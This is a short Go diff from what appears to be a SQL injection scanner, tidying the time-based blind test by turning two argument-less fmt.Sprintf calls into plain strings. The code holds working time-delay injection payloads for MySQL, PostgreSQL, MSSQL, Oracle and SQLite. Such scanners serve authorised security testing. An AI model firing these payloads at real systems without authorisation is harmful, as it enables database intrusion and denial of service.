@@ -30,13 +30,13 @@ func RunTimeBasedBlind(client *http.Client, baseURL string, target models.ScanTa
 
 	timePayloads := map[string]string{
 		"MySQL/MariaDB":       fmt.Sprintf("' AND SLEEP(%d)--", sleepSeconds),
-		"MySQL (BENCHMARK)":   fmt.Sprintf("' AND BENCHMARK(10000000,SHA1('dorm'))--"),
+		"MySQL (BENCHMARK)":   "' AND BENCHMARK(10000000,SHA1('dorm'))--",
 		"PostgreSQL":          fmt.Sprintf("'; SELECT pg_sleep(%d)--", sleepSeconds),
 		"PostgreSQL (inline)": fmt.Sprintf("' AND (SELECT pg_sleep(%d))::text='1", sleepSeconds),
 		"MSSQL":               fmt.Sprintf("'; WAITFOR DELAY '00:00:%02d'--", sleepSeconds),
 		"MSSQL (stacked)":     fmt.Sprintf("' WAITFOR DELAY '00:00:%02d'--", sleepSeconds),
 		"Oracle":              fmt.Sprintf("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('dorm',%d)--", sleepSeconds),
-		"SQLite":              fmt.Sprintf("' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--"),
+		"SQLite":              "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--",
 	}
 
 	// Test on multiple endpoints
